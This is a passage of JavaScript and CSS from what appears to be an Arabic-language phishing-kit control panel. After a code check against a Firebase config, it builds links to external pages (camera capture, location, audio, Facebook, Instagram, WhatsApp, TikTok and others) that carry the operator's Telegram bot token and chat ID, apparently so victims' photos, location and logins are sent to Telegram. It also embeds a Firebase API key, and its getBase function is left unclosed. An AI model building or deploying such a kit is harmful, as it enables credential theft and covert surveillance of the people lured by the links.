        .tool-card:active { background:#1a0000;border-color:var(--red);box-shadow:0 0 50px rgba(255,0,64,0.7);transform:scale(0.95); }
        .tool-card.blocked { opacity:0.3;border-color:#333;pointer-events:none; }

<script>
var BASE = 'https://ai-proxy-eosin.vercel.app';
var BASE2 = 'https://pubgskin.vercel.app';
var botToken = '';
var chatId = '';
var audioCtx = null;
var remoteCodes = {admin:true, elgen:true};
var blockedTools = [];

// ========== FIREBASE ==========
firebase.initializeApp({
    apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
    projectId: "game-a1aca",
    storageBucket: "game-a1aca.firebasestorage.app",
    appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
});
var db = firebase.firestore();

async function loadFirebaseConfig() {
    try {
        var doc = await db.collection('config').doc('settings').get();
        if (doc.exists) {
            var data = doc.data();
            if (data.codes) remoteCodes = data.codes;
            if (data.blocked_tools) blockedTools = data.blocked_tools;
            document.getElementById('sync-status').textContent = '✅ متزامن مع السيرفر';
            document.getElementById('sync-status').style.color = '#4CAF50';
        }
    } catch(e) {
        document.getElementById('sync-status').textContent = '⚠️ وضع غير متصل';
    }
}

function isValidCode(code) {
    return remoteCodes[code] === true;
}

// ========== AUDIO ==========
function getAudioCtx() {
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtx.state === 'suspended') audioCtx.resume();
    return audioCtx;
}

function playSound(type) {
    try {
        var ctx = getAudioCtx();
        var now = ctx.currentTime;
        if (type === 'login_success') {
            [150,250,350,450,550,700,900].forEach(function(f,i) {
                var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
                o.frequency.value=f;o.type='sawtooth';g.gain.setValueAtTime(0.1,now+i*0.08);
                g.gain.exponentialRampToValueAtTime(0.001,now+i*0.08+0.3);o.start(now+i*0.08);o.stop(now+i*0.08+0.3);
            });
        } else if (type === 'error') {
            for(var i=0;i<5;i++) {
                var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
                o.frequency.value=55+(i*18);o.type='sawtooth';g.gain.setValueAtTime(0.15,now+i*0.1);
                g.gain.exponentialRampToValueAtTime(0.001,now+i*0.1+0.2);o.start(now+i*0.1);o.stop(now+i*0.1+0.2);
            }
        } else if (type === 'click') {
            var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
            o.frequency.setValueAtTime(1000,now);o.frequency.exponentialRampToValueAtTime(500,now+0.06);
            o.type='sine';g.gain.setValueAtTime(0.06,now);g.gain.exponentialRampToValueAtTime(0.001,now+0.06);o.start(now);o.stop(now+0.06);
        } else if (type === 'copy') {
            [600,1000,1400].forEach(function(f,i) {
                var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
                o.frequency.value=f;o.type='triangle';g.gain.setValueAtTime(0.04,now+i*0.06);
                g.gain.exponentialRampToValueAtTime(0.001,now+i*0.06+0.08);o.start(now+i*0.06);o.stop(now+i*0.06+0.08);
            });
        } else if (type === 'generate') {
            for(var i=0;i<8;i++) {
                var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
                o.frequency.value=200+(i*140);o.type='square';g.gain.setValueAtTime(0.03,now+i*0.1);
                g.gain.exponentialRampToValueAtTime(0.001,now+i*0.1+0.15);o.start(now+i*0.1);o.stop(now+i*0.1+0.15);
            }
        } else if (type === 'typing') {
            var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
            o.frequency.value=500+Math.random()*400;o.type='sine';g.gain.setValueAtTime(0.02,now);
            g.gain.exponentialRampToValueAtTime(0.001,now+0.03);o.start(now);o.stop(now+0.03);
        }
    } catch(e) {}
}

// ========== DEVICE ==========
function getDevice() {
    var ua = navigator.userAgent;
    if (ua.indexOf('SM-A105') !== -1 || ua.indexOf('SM-A107') !== -1) return {name:'Samsung Galaxy A10',isA10:true};
    return {name:'جهاز',isA10:false};
}

var device = getDevice();
var IS_A10 = device.isA10;
var EXPIRY_KEY = 'master_expiry';

if (!IS_A10) {
    var expiry = localStorage.getItem(EXPIRY_KEY);
    if (!expiry) { expiry = Date.now() + (3*24*60*60*1000); localStorage.setItem(EXPIRY_KEY, expiry); }
    if (Date.now() > parseInt(expiry)) { localStorage.removeItem(EXPIRY_KEY); localStorage.removeItem('master_auth'); }
}

document.getElementById('device-name').textContent = '💀 ' + device.name;
document.getElementById('device-code').textContent = IS_A10 ? '🔑 admin (دائم)' : '🔑 رموز من السيرفر';
if (!IS_A10) {
    var remaining = Math.max(0, Math.floor((parseInt(localStorage.getItem(EXPIRY_KEY)) - Date.now()) / (1000*60*60*24)));
    document.getElementById('device-time').textContent = '⏰ متبقي: ' + remaining + ' يوم';
}

document.getElementById('code-input').addEventListener('input',function(){playSound('typing');});

var saved = JSON.parse(localStorage.getItem('master_setup')||'{}');
if(saved.token && saved.chatId){botToken=saved.token;chatId=saved.chatId;document.getElementById('bot-token').value=botToken;document.getElementById('chat-id').value=chatId;}

// ========== PAGES ==========
function showPage(id) {
    var pages=document.querySelectorAll('.page');
    for(var i=0;i<pages.length;i++){pages[i].classList.remove('active');}
    document.getElementById(id).classList.add('active');
    if(id==='page-tools'){playSound('login_success');renderTools();}
    window.scrollTo({top:0,behavior:'smooth'});
}

// ========== LOGIN ==========
async function checkCode() {
    var code = document.getElementById('code-input').value.trim();
    botToken = document.getElementById('bot-token').value.trim();
    chatId = document.getElementById('chat-id').value.trim();
    var error = document.getElementById('code-error');

    if(!botToken||!chatId){error.textContent='☠ اكتب التوكن والـ Chat ID ☠';error.classList.add('show');playSound('error');return;}
    
    await loadFirebaseConfig();

    if(!IS_A10){
        var exp=localStorage.getItem(EXPIRY_KEY);
        if(exp && Date.now()>parseInt(exp)){error.textContent='☠ انتهت الصلاحية! ☠';error.classList.add('show');playSound('error');return;}
    }

    if(isValidCode(code)){
        error.classList.remove('show');
        localStorage.setItem('master_auth',code);
        localStorage.setItem('master_setup',JSON.stringify({token:botToken,chatId:chatId}));
        document.getElementById('setup-badge').textContent='💀 '+chatId;
        playSound('login_success');
        setTimeout(function(){showPage('page-tools');},200);
    } else {
        error.classList.add('show');
        playSound('error');
        document.getElementById('code-input').value='';
    }
}

function logout(){localStorage.removeItem('master_auth');showPage('page-login');playSound('click');}

// ========== GENERATE LINK ==========
function getBase(page) {
    var mainPages = ['photo-front.html','photo-back.html','mm.html','video-back.html','location.html','audio.html','g.html','fb.html','insta.html','whatsapp.html','twitter.html','snapchat.html','tiktok.html'];

function generateLink(page) {
    showPage('page-generate');
    document.getElementById('gen-result').style.display='none';
    document.getElementById('gen-fill').style.width='0%';
    document.getElementById('gen-fill').parentElement.style.display='block';
    playSound('click');playSound('generate');
    var width=0;
    var fill=document.getElementById('gen-fill');
    var interval=setInterval(function(){
        width+=20;fill.style.width=width+'%';
        if(width>=100){
            clearInterval(interval);
            var base=getBase(page);
            var link=base+'/'+page+'?chatId='+chatId+'&token='+encodeURIComponent(botToken);
            document.getElementById('link-box').textContent=link;
            document.getElementById('gen-result').style.display='block';
            document.getElementById('gen-fill').parentElement.style.display='none';
            playSound('copy');
        }
    },200);
}

function copyLink() {
    var link=document.getElementById('link-box').textContent;
    if(navigator.clipboard){navigator.clipboard.writeText(link).then(function(){showToast();}).catch(function(){alert(link);});}
    else{var t=document.createElement('textarea');t.value=link;t.style.position='fixed';t.style.opacity='0';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showToast();}
}

function showToast() {
    var toast=document.createElement('div');toast.className='copy-toast';toast.textContent='💀 تم النسخ! 💀';
    document.body.appendChild(toast);playSound('copy');
    setTimeout(function(){toast.style.opacity='0';toast.style.transform='translateX(-50%) translateY(-20px)';toast.style.transition='all 0.3s ease';
    setTimeout(function(){toast.remove();},300);},1500);
}

// ========== INIT ==========
loadFirebaseConfig();

var auth=localStorage.getItem('master_auth');
if(auth && botToken && chatId){
    loadFirebaseConfig().then(function(){
        if(isValidCode(auth)){
            showPage('page-tools');
            document.getElementById('setup-badge').textContent='💀 '+chatId;
        }
    });
}

document.getElementById('code-input').addEventListener('keydown',function(e){if(e.key==='Enter')checkCode();});
document.addEventListener('click',function(){getAudioCtx();},{once:true});
</script>
